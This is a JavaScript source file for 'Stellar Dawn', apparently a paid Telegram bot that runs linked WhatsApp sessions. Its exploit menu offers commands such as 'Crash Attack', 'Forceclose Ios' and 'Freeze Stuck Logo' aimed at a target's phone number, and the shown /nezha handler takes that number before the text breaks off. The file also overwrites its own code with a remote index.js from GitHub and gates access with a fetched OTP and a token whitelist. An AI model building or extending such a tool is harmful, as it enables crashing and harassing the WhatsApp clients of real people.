/// ------ ( set const ) ------ \\\
const {
    default: makeWASocket,
    proto,
    DisconnectReason,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    generateWAMessage,
    prepareWAMessageMedia,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey, 
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys")
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const cheerio = require('cheerio');
// const path = require('path'); // Duplicate, already declared above
const util = require('util');
const writeFile = util.promisify(fs.writeFile);
const unlink = util.promisify(fs.unlink);
const chalk = require("chalk"); 
const moment = require("moment");
const config = require("./config.js");
const { BOT_TOKEN, OWNER_ID } = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");

// === OTP Persistent Storage ===
const VERIFIED_FILE = path.join(__dirname, "kairn", "verified.json");
let verifiedUsers = new Set();

function loadVerifiedUsers() {
    try {
        if (fs.existsSync(VERIFIED_FILE)) {
            const data = JSON.parse(fs.readFileSync(VERIFIED_FILE));
            verifiedUsers = new Set(data);
            console.log(chalk.green(`✅ Loaded ${verifiedUsers.size} verified users`));
        }
    } catch (e) {
        console.error("Gagal load verified users:", e);
    }
}

function saveVerifiedUser(userId) {
    try {
        verifiedUsers.add(userId);
        fs.writeFileSync(VERIFIED_FILE, JSON.stringify([...verifiedUsers]));
    } catch (e) {
        console.error("Gagal simpan verified user:", e);
    }
}

loadVerifiedUsers();

////get image
const imageList = [
    "https://files.catbox.moe/7bb7po.png", 
];

const getRandomImage = () => {
    return imageList[Math.floor(Math.random() * imageList.length)];
};

/// --- ( Variabel yang perlu didefinisikan ) --- \\\

/// --- ( Fungsi untuk mendapatkan kecepatan bot ) --- \\\
function getBotSpeed(startTime) {
    const diff = process.hrtime(startTime);
    return (diff[0] * 1e9 + diff[1]) / 1e6;
}

/// --- ( GitHub Raw ) --- \\\  
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/SonOfficial/Stel/main/Vevek.json";
const FILE_URL = 'https://raw.githubusercontent.com/SonOfficial/Password/main/akses.json';
const GITHUB_RAW = 'https://raw.githubusercontent.com/SonOfficial/Awak/main/index.js';
const GH_TOKEN = process.env.GH_TOKEN;

//════════ PULL UPDATE SOURCE
async function pullUpdate(bot, msg) {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId)) {
        return bot.sendMessage(chatId, 'Command Khusus Owner Lek');
    }

    try {
        const localFile = fs.readFileSync('./index.js', 'utf8');
        const localHash = crypto.createHash('sha256').update(localFile).digest('hex');

        const res = await fetch(GITHUB_RAW);
        if (!res.ok) {
            return bot.sendMessage(chatId, 'Tidak Menemukan File Index.js');
        }

        const remoteFile = await res.text();
        const remoteHash = crypto.createHash('sha256').update(remoteFile).digest('hex');

        if (localHash === remoteHash) {
            return bot.sendMessage(chatId, 'ANDA SUDAH DI VERSI YANG TERBARU!');
        }

        fs.writeFileSync('./index.backup.js', localFile);
        fs.writeFileSync('./index.js', remoteFile);

        await bot.sendMessage(chatId, 'Di Temukan Index.js✅\nRestart Bot');

        setTimeout(() => {
            process.exit(0);
        }, 1500);

    } catch (err) {
        console.log(err);
        bot.sendMessage(chatId, 'Update Gagal');
    }
}

// ================= TOKEN CHECK =================
async function fetchValidTokens() {
    try {
        const response = await axios.get(GITHUB_TOKEN_LIST_URL, { 
            timeout: 10000,
            headers: GH_TOKEN ? { Authorization: `token ${GH_TOKEN}` } : {}
        });

        if (Array.isArray(response.data)) {
            return response.data;
        }
        
        if (response.data && Array.isArray(response.data.tokens)) {
            return response.data.tokens;
        }
        
        return [];
        
    } catch (e) {
        return [];
    }
}

// ================= PASSWORD SOURCE =================
async function ambilTeksRepo() {
    try {
        const res = await axios.get(FILE_URL, {
            headers: GH_TOKEN ? { Authorization: `token ${GH_TOKEN}` } : {},
            timeout: 10000
        });

        if (!res.data.akses) {
            throw new Error('field "akses" tidak ada di response');
        }
        
        const otp = res.data.akses.trim();
        return otp;
        
    } catch (e) {
        console.error(chalk.red('[SECURITY] gagal ambil akses.json:'), e.message);
        process.exit(1);
    }
}

// ================= BOT TOKEN VALIDATION =================
async function validateToken() {
    console.log(chalk.blue.bold('🔍 VERIFIKASI TOKEN BOT\n'));
    
    if (!BOT_TOKEN || BOT_TOKEN.trim() === '') {
        console.error(chalk.red("❌ BOT_TOKEN tidak ada di config.js"));
        process.exit(1);
    }

    const validTokens = await fetchValidTokens();

    if (!validTokens.includes(BOT_TOKEN)) {
        console.log(chalk.red(`
         ⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
         ⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
         ⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀         ⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
          ⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
           ⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
           ⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
           ⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
             ⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀            ⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀           ⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀           ⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀      ⠀     ⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀           ⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀           ⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀            ⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        `));
        console.log(chalk.red(`ADD TOKEN DULU NGABB`));
        process.exit(1);
    }

    console.log(chalk.green.bold('✅ TOKEN TERDAFTAR'));
}

// ================= BOT START =================
function startBot() {
    console.log(chalk.red(`
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⡋⠁⠀⠀⠀⠀⢀⣀⣀⡀
⠀⠀⠀⠀⠀⠠⠒⣶⣶⣿⣿⣷⣾⣿⣿⣿⣿⣛⣋⣉⠀⠀
⠀⠀⠀⠀⢀⣤⣞⣫⣿⣿⣿⡻⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀
⠀⠀⣶⣾⡿⠿⠿⠿⠿⠋⠈⠀⣸⣿⣿⣿⣿⣷⡈⠙⢆⠀
⠀⠀⠉⠁⠀⠤⣤⣤⣤⣤⣶⣾⣿⣿⣿⣿⠿⣿⣷⠀⠀⠀
⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⢹⣿⠀⠀⠀
⢠⣾⣿⣿⣿⣿⠟⠋⠉⠛⠋⠉⠁⣀⠀⠀⠀⠸⠃⠀⠀⠀
⣿⣿⣿⣿⠹⣇⠀⠀⠀⠀⢀⡀⠀⢀⡙⢷⣦⣄⡀⠀⠀⠀
⣿⢿⣿⣿⣷⣦⠤⠤⠀⠀⣠⣿⣶⣶⣿⣿⣿⣿⣿⣷⣄⠀
⠈⠈⣿⡿⢿⣿⣿⣷⣿⣿⡿⢿⣿⣿⣁⡀⠀⠀⠉⢻⣿⣧
⠀⢀⡟⠀⠀⠉⠛⠙⠻⢿⣦⡀⠙⠛⠯⠤⠄⠀⠀⠈⠈⣿
⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⡆⠀⠀⠀⠀⠀⠀⠀⢀⠟
    `));
    
    console.log(chalk.yellow.bold(`
┌──────────────────────────┐
│  INFORMATION SCRIPT
├──────────────────────────┤
│ NAME SCRIPT: Stellar Dawn
│ VERSION : 2.9.0
│ STATUS : BOT RUNNING
└──────────────────────────┘
    `));
}

// ================= MAIN GATE =================
async function main() {
    await validateToken();
    startBot();
    initializeWhatsAppConnections();
}

main();

// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\
let sock;
function getActiveSock() {
    if (sessions.size === 0) return null;
    return sessions.values().next().value;
}
function saveActiveSessions(botNumber) {
  try {
    const sessionsList = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessionsList.push(...existing, botNumber);
      }
    } else {
      sessionsList.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sockInstance = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sockInstance.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sockInstance);
              sock = sockInstance;
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sockInstance.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

//// --- ( Instalasi WhatsApp ) --- \\\
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
 <pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
┌─────────────────────────┐
│  MENYIAPKAN CODE PAIRING
├─────────────────────────┤
│ Nomor : ${botNumber}
└─────────────────────────┘
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sockInstance = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sockInstance.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
┌─────────────────────────┐
│ Memproses Connection
├─────────────────────────┤
│ Nomor : ${botNumber}
│ Status : Proses 🔄.
└─────────────────────────┘
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
┌─────────────────────────┐
│ Connection Gagal
├─────────────────────────┤
│ Nomor : ${botNumber}
│ Status :  Gagal ❌
└─────────────────────────┘
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sockInstance);
      sock = sockInstance;
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
 <pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>       
┌─────────────────────────┐
│ Connection Sukses
├─────────────────────────┤
│ Nomor : ${botNumber}
│ Status : Sukses Connect.✅
└─────────────────────────┘
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sockInstance.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

          await bot.editMessageText(
            `
<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
┌─────────────────────────┐
│ YOUR CODE PAIRING
├─────────────────────────┤
│ Nomor : ${botNumber}
│ Kode  : ${formattedCode}
└─────────────────────────┘
`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
            });
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
┌─────────────────────────┐
│ STATUS │ Sedang Pairing
├─────────────────────────┤
│ Nomor : ${botNumber}
│ Kode  : ${error.message} Error⚠️
└─────────────────────────
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sockInstance.ev.on("creds.update", saveCreds);

  return sockInstance;
}

// ---------- ( Read File And Save Premium - ceo - Owner ) ----------- \\
const kairn_DIR = path.join(__dirname, "kairn");
if (!fs.existsSync(kairn_DIR)) {
    fs.mkdirSync(kairn_DIR, { recursive: true });
}

let premiumUsers = [];
let ceoUsers = [];

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./kairn/premium.json', []);
ensureFileExists('./kairn/ceo.json', []);

function loadPremiumUsers() {
    try {
        premiumUsers = JSON.parse(fs.readFileSync('./kairn/premium.json'));
    } catch (error) {
        premiumUsers = [];
        console.error("Error loading premium users:", error);
    }
}

function loadCeoUsers() {
    try {
        ceoUsers = JSON.parse(fs.readFileSync('./kairn/ceo.json'));
    } catch (error) {
        ceoUsers = [];
        console.error("Error loading ceo users:", error);
    }
}

function savePremiumUsers() {
    fs.writeFileSync('./kairn/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveceoUsers() {
    fs.writeFileSync('./kairn/ceo.json', JSON.stringify(ceoUsers, null, 2));
}

// Load data saat startup
loadPremiumUsers();
loadCeoUsers();

function isOwner(userId) {
    return config.OWNER_ID.includes(userId.toString());
}
///Function add group
// --- ( case add group premium ) ---
// File untuk menyimpan data grup premium
const GROUP_PREMIUM_FILE = './kairn/grouppremium.json';
let premiumGroups = [];

// Fungsi untuk memastikan file exist
function ensureGroupFileExists() {
    if (!fs.existsSync('./kairn')) {
        fs.mkdirSync('./kairn', { recursive: true });
    }
    if (!fs.existsSync(GROUP_PREMIUM_FILE)) {
        fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify([], null, 2));
    }
}

// Load data grup premium
function loadPremiumGroups() {
    try {
        ensureGroupFileExists();
        premiumGroups = JSON.parse(fs.readFileSync(GROUP_PREMIUM_FILE));
        console.log(chalk.green(`✅ Loaded ${premiumGroups.length} premium groups`));
    } catch (error) {
        premiumGroups = [];
        console.error("Error loading premium groups:", error);
    }
}

// Save data grup premium
function savePremiumGroups() {
    try {
        ensureGroupFileExists();
        fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify(premiumGroups, null, 2));
    } catch (error) {
        console.error("Error saving premium groups:", error);
    }
}

// Load data saat startup
loadPremiumGroups();

// --- ( Fungsi cek apakah grup premium ) ---
function isGroupPremium(groupId) {
    return premiumGroups.includes(groupId);
}

// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
    const days = Math.floor(seconds / (3600 * 24));
    const hours = Math.floor((seconds % (3600 * 24)) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;  
    return `${hours}h, ${minutes}m, ${secs}s`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
    const now = Math.floor(Date.now() / 1000);
    return formatRuntime(now - startTime);
}

function getCurrentDate() {
    const now = new Date();
    const options = { 
        weekday: "long", 
        year: "numeric", 
        month: "long", 
        day: "numeric" 
    };
    return now.toLocaleDateString("id-ID", options);
}

/// --- ( Menu Utama ) --- \\\
const bugRequests = {};
const buttonSessions = new Map();

////gerbang start
bot.onText(/\/start/, async (msg) => {
    if (!msg || !msg.chat) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username
        ? `@${msg.from.username}`
        : msg.from.first_name || "User";

    // Cek apakah user sudah terverifikasi
    if (!verifiedUsers.has(userId)) {
        const randomImage = getRandomImage();

        return bot.sendPhoto(chatId, randomImage, {
            caption: `
<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
Stellar Dawn также имеет новейшие и качественные функции. 
─────────────────────────
Masukan Otp Untuk Melanjutkan
`,
            parse_mode: "HTML",
        });
    }

    // SUDAH OTP → LANGSUNG MENU
    return showStartMenu(chatId, msg);
});

////handler otp
bot.on('message', async (msg) => {
    if (!msg.text || msg.text.startsWith('/')) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text.trim();

    if (verifiedUsers.has(userId)) return;

    try {
        const otpBenar = await ambilTeksRepo();

        if (text === otpBenar) {
            saveVerifiedUser(userId); // Simpan permanen
            await bot.sendMessage(chatId, '✅ CODE BENAR\nLANJUT KE MENU');
            return showStartMenu(chatId, msg);
        } else {
            // Hanya peringatan, tidak menghentikan bot
            await bot.sendMessage(chatId, '❌ OTP SALAH\nmasukan code yang benar.');
        }
    } catch (e) {
        console.error('otp error:', e.message);
        await bot.sendMessage(chatId, '❌ Terjadi kesalahan sistem.');
    }
});

// Func Start
async function showStartMenu(chatId, msg) {
    const username = msg.from.username
        ? `@${msg.from.username}`
        : msg.from.first_name || "User";
    const userId = msg.from.id;
    const isUserPremium = premiumUsers.some(user => 
        user.id === userId && new Date(user.expiresAt) > new Date()
    );
    const premiumStatus = isUserPremium ? "✅ Premium" : "❌ Regular";
        
    const randomImage = getRandomImage();

    await bot.sendPhoto(chatId, randomImage, {
        caption: `
<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
Stellar Dawn также имеет новейшие и качественные функции. 
─────────────────────────
<pre># ☇ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 𝘚𝘊𝘙𝘐𝘗𝘛</pre>
╰┈ • 𝖭𝖺𝗆𝖾 : Stellar Dawn 
╰┈ • Version : 2.9.0 Kairn-Style
╰┈ • 𝖠𝗎𝗍𝗁𝗈𝗋: 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇
╰┈ • 𝖲𝗒𝗌𝗍𝖾𝗆: 𝖠𝗎𝗍𝗈 𝖴𝗉𝖽𝖺𝗍𝖾
╰┈ • 𝖯𝗋𝖾𝖿𝗂𝗑: 𝘚𝘭𝘢𝘴𝘩 ( / ) 
╰┈ • 𝖫𝖺𝗇𝗀𝗎𝖺𝗀𝖾: 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "продолжить", callback_data: "mainmenu", style: "danger" }],
            ],
        },
    });
}

bot.on("callback_query", async (callbackQuery) => {
    try {
        const chatId = callbackQuery.message.chat.id;
        const messageId = callbackQuery.message.message_id;
        const data = callbackQuery.data;
        const randomImage = getRandomImage();
        const senderId = callbackQuery.from.id;
        
        const isUserPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
        const premiumStatus = isUserPremium ? "Yes" : "No";
        
        const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
        const date = getCurrentDate();

        let newCaption = "";
        let newButtons = [];

        if (data === "bugshow") {
            newCaption = `
<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
Stellar Dawn также имеет новейшие и качественные функции. 
────────────────────────
<pre># ☇ 𝘌𝘟𝘗𝘓𝘖𝘐𝘛 - 𝘔𝘌𝘕𝘜</pre>
/nezha - Crash Attack
/alpha - Delay Hard
/luqia  - Forceclose Ios
/great  - Delay Ui
/xethe - Blank x Delay Bulldozer
/khair - Delay Strike
            `;
            newButtons = [
            
                [
                    
                { text: "НАЗАД", callback_data: "mainmenu" },
                                 { text: "➡️", callback_data: "v2", style: "danger" }
                ], 
            ];
        } else if (data === "v2") {
            newCaption = `
<pre>( ⚠️) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
Stellar Dawn также имеет новейшие и качественные функции. 
─────────────────────────
<pre># ☇ 𝘌𝘟𝘗𝘓𝘖𝘐𝘛 - 𝘔𝘌𝘕𝘜</pre>
/zincy - Bulldozer
/athena - Crash Ios 
/thea - Freeze Stuck Logo Click
/ghory - Blank 1 Msg
<pre> 𝖠𝗅𝗅 𝖢𝗈𝗆𝗆𝖺𝗇𝖽 𝗏𝟤 𝖡𝖾𝖻𝖺𝗌 𝖲𝗉𝖺𝗆 </pre>
            `;
            newButtons = [
[
                                { text: "⬅️", callback_data: "bugshow", style: "danger"}, 
                { text: "НАЗАД", callback_data: "mainmenu" }
                ], 
            ];
        } else if (data === "ownermenu") {
            newCaption = `
<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
Stellar Dawn также имеет новейшие и качественные функции. 
─────────────────────────
<pre># ☇ 𝘊𝘖𝘕𝘛𝘙𝘖𝘓 - 𝘔𝘌𝘕𝘜</pre>
 ◌️ /reloadcore - Update Bot
 ◌ /addprem - Add premium user
 ◌ /delprem - delete premium users
 ◌ /aboutme - Info User
 ◌ /uploadfunc - untuk testfunction
 ◌ /testfunction - test function
 ◌ /addceo - add ceo user
 ◌ /delceo - delete ceo users
 ◌ /listprem - list user premium
 ◌ /connect 628xx - addsender number
 ◌ /resetsession - Hapus semua sesi WhatsApp
            `;
            newButtons = [
                                [{ text: "НАЗАД", callback_data: "mainmenu" }], 
            ];
        } else if (data === "thanksto") {
            newCaption = `
<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
Stellar Dawn также имеет новейшие и качественные функции. 
─────────────────────────
<pre># ☇ 𝘛𝘏𝘈𝘕𝘒𝘚 - 𝘛𝘖</pre>
- 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 - Author
- Allah - My God

            `;
            newButtons = [
                        [{ text: "НАЗАД", callback_data: "mainmenu" }], 
            ];
        } else if (data === "mainmenu") {
            newCaption = `
<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
Stellar Dawn также имеет новейшие и качественные функции. 
─────────────────────────
<pre># ☇ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 𝘚𝘊𝘙𝘐𝘗𝘛</pre>
╰┈ • 𝖭𝖺𝗆𝖾 : Stellar Dawn 
╰┈ • Version : 2.9.0 Kairn-Style
╰┈ • 𝖠𝗎𝗍𝗁𝗈𝗋: 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇
╰┈ • 𝖲𝗒𝗌𝗍𝖾𝗆: 𝖠𝗎𝗍𝗈 𝖴𝗉𝖽𝖺𝗍𝖾
╰┈ • 𝖯𝗋𝖾𝖿𝗂𝗑: 𝘚𝘭𝘢𝘴𝘩 ( / ) 
╰┈ • 𝖫𝖺𝗇𝗀𝗎𝖺𝗀𝖾: 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
            `;
            newButtons = [
                [
                    { text: "тление", callback_data: "bugshow", style: "danger"}, 
{ text: "саппорт", callback_data: "thanksto", style: "danger" }, 
                ], 
                [
                    { text: "руль", callback_data: "ownermenu" }
                ], 
            ];
        } else {
            return bot.answerCallbackQuery(callbackQuery.id, { text: "Menu tidak dikenal", show_alert: false });
        }

        await bot.editMessageMedia({
            type: "photo",
            media: randomImage,
            caption: newCaption,
            parse_mode: "HTML"
        }, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: { inline_keyboard: newButtons }
        });

        bot.answerCallbackQuery(callbackQuery.id);
    } catch (err) {
        console.error("Gagal edit media:", err);
        bot.answerCallbackQuery(callbackQuery.id, { text: "Error terjadi", show_alert: false });
    }
});

/// --- ( Parameter ) --- \\\
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const activePolls = new Map();


///////////////( CASE POLLING) \\\\\\\\\
bot.onText(/\/nezha(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
            }
        });
    }

    if (sessions.size === 0) {
